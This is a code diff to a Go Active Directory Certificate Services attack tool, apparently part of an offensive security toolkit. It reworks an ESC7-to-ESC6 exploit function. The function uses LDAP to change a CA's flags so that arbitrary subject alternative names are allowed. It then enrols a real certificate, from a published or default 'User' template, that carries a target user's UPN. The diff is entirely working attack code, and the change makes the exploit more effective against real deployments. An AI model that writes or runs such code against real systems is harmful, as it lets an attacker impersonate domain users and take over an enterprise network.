@@ -2,8 +2,6 @@ package pki
 
 import (
 	"crypto/ecdsa"
-	"crypto/elliptic"
-	"crypto/rand"
 	"crypto/x509"
 	"fmt"
 
@@ -186,7 +184,7 @@ func ExploitESC7(cfg *ADCSConfig, caName, targetUPN string) (*x509.Certificate, 
 	searchReq := ldap.NewSearchRequest(
 		baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases,
 		0, 0, false, filter,
-		[]string{"distinguishedName", "flags"},
+		[]string{"distinguishedName", "flags", "certificateTemplates"},
 		nil,
 	)
 
@@ -221,29 +219,27 @@ func ExploitESC7(cfg *ADCSConfig, caName, targetUPN string) (*x509.Certificate, 
 	}
 	fmt.Printf("[+] CA flags modified: %s -> %s (EDITF_ATTRIBUTESUBJECTALTNAME2 enabled)\n", originalFlags, newFlags)
 
-	// Step 4: Exploit as ESC6 — forge a certificate with the target UPN in the SAN
-	// With EDITF_ATTRIBUTESUBJECTALTNAME2 enabled, any template can be abused
-	// to request a certificate with an arbitrary SAN.
-	fmt.Println("[*] Exploiting CA as ESC6 (arbitrary SAN enabled)...")
-	signingKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
+	// Step 4: Exploit as ESC6 — enroll for a certificate with the target UPN injected
+	// via request attributes. With EDITF_ATTRIBUTESUBJECTALTNAME2 enabled, any
+	// template can be abused to request a certificate with an arbitrary SAN.
+	// Use the "User" template as a default — it's present on all AD CS deployments
+	// and has Client Authentication EKU.
+	enrollTemplate := "User"
+	if len(result.Entries[0].GetAttributeValues("certificateTemplates")) > 0 {
+		// Prefer a template from the CA's published list
+		enrollTemplate = result.Entries[0].GetAttributeValues("certificateTemplates")[0]
+	}
+	fmt.Printf("[*] Exploiting CA as ESC6 (arbitrary SAN enabled) using template %q...\n", enrollTemplate)
+	cert, certKey, err := EnrollCertificate(cfg, enrollTemplate, targetUPN, true)
 	if err != nil {
 		// Restore before returning
 		restoreReq := ldap.NewModifyRequest(serviceDN, nil)
 		restoreReq.Replace("flags", []string{originalFlags})
 		conn.Modify(restoreReq)
-		return nil, nil, fmt.Errorf("generate signing key: %w", err)
+		return nil, nil, fmt.Errorf("enrollment via ESC6 failed: %w", err)
 	}
 
-	cert, certKey, err := ForgeCertificate(signingKey, targetUPN)
-	if err != nil {
-		// Restore before returning
-		restoreReq := ldap.NewModifyRequest(serviceDN, nil)
-		restoreReq.Replace("flags", []string{originalFlags})
-		conn.Modify(restoreReq)
-		return nil, nil, fmt.Errorf("forge cert via ESC6: %w", err)
-	}
-
-	fmt.Printf("[+] Forged certificate for %s via ESC7->ESC6 on CA %q\n", targetUPN, caName)
+	fmt.Printf("[+] Certificate obtained for %s via ESC7->ESC6 on CA %q\n", targetUPN, caName)
 
 	// Step 5: Restore original CA configuration
 	fmt.Println("[*] Restoring original CA configuration...")
